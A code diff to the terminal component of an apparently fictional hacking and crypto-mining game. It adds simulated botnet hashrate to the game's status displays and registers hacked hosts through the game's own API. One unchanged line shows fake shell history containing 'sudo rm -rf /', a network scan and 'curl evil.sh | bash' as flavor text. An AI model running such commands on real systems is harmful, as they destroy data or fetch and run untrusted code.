@@ -96,8 +96,12 @@ export function Terminal({ state, setState, onOpenApp }) {
         if (args[0] === 'wallet.dat') return push(`[ENCRYPTED WALLET]  balance: ${fmtCrypto(state.crypto)} ⟠`, 'ok')
         if (args[0] === '.bash_history') return push("sudo rm -rf /\nnmap -sS 10.0.0.0/8\ncurl evil.sh | bash\necho 'oh no'", 'dim')
         return push('cat: ' + (args[0] || '???') + ': no such file', 'err')
-      case 'balance': case 'wallet':
-        return push(`⟠ ${fmtCrypto(state.crypto)}   (hashrate: ${state.hashrate} H/s)`, 'ok')
+      case 'balance': case 'wallet': {
+        const slaveHsW = Math.round((state.slaveEarned ?? 0) * 1000)
+        const totalHsW = state.hashrate + slaveHsW
+        const hsDetail = slaveHsW > 0 ? `${totalHsW} H/s (${state.hashrate} local + ${slaveHsW} botnet)` : `${state.hashrate} H/s`
+        return push(`⟠ ${fmtCrypto(state.crypto)}   (hashrate: ${hsDetail})`, 'ok')
+      }
       case 'sysinfo': case 'specs': return sysinfo()
       case 'scan': case 'nmap':  return scanHosts()
       case 'hack': case 'exploit': return hackHost(args[0])
@@ -236,7 +240,12 @@ export function Terminal({ state, setState, onOpenApp }) {
     Audio.ok()
     await typeOut(`[$] Transferring ${t.reward.toFixed(4)} ⟠ to wallet…`, 'ok')
     setState(s => ({ ...s, crypto: s.crypto + t.reward, hackedHosts: Array.from(new Set([...s.hackedHosts, t.host])) }))
-    await typeOut('[$] Hack the planet.', 'mag')
+    fetch('/api/player/hack-access', {
+      method: 'POST', credentials: 'include',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ hostname: t.host }),
+    }).catch(() => {})
+    await typeOut('[$] Hack the planet. Botnet node registered.', 'mag')
   }
   const hackFail = async (t, reason) => {
     await typeOut('[×] DETECTED. ICE engaged. Disconnecting…', 'err')
@@ -265,14 +274,16 @@ export function Terminal({ state, setState, onOpenApp }) {
       { label: 'Overclock CPU', col: 'cpuLevel', baseHs: 12, hsGrowth: 1.5, baseCost: 0.12, costGrowth: 1.7 },
       { label: 'Dark Fiber',    col: 'netLevel', baseHs: 30, hsGrowth: 1.7, baseCost: 0.25, costGrowth: 1.9 },
     ]
+    const slaveHs = Math.round((state.slaveEarned ?? 0) * 1000)
     push('─── SYSTEM SPECS ───────────────────────', 'mag')
     for (const s of SPECS) {
-      const lvl     = state[s.col]
-      const hs      = Math.round(s.baseHs * Math.pow(s.hsGrowth, lvl - 1))
+      const lvl      = state[s.col]
+      const hs       = Math.round(s.baseHs * Math.pow(s.hsGrowth, lvl - 1))
       const nextCost = parseFloat((s.baseCost * Math.pow(s.costGrowth, lvl - 1)).toFixed(6))
       push(`  ${s.label.padEnd(16)} L${String(lvl).padStart(2)}   ${String(hs).padStart(7)} H/s   next: ${fmtCrypto(nextCost)} ⟠`, '')
     }
-    push(`${'  TOTAL'.padEnd(16)}       ${String(state.hashrate).padStart(7)} H/s`, 'ok')
+    push(`  ${'Botnet slaves'.padEnd(16)}        ${String(slaveHs).padStart(7)} H/s`, slaveHs > 0 ? 'warn' : 'dim')
+    push(`${'  TOTAL'.padEnd(16)}       ${String(state.hashrate + slaveHs).padStart(7)} H/s`, 'ok')
     push(`  wallet: ${fmtCrypto(state.crypto)} ⟠`, 'dim')
   }
 
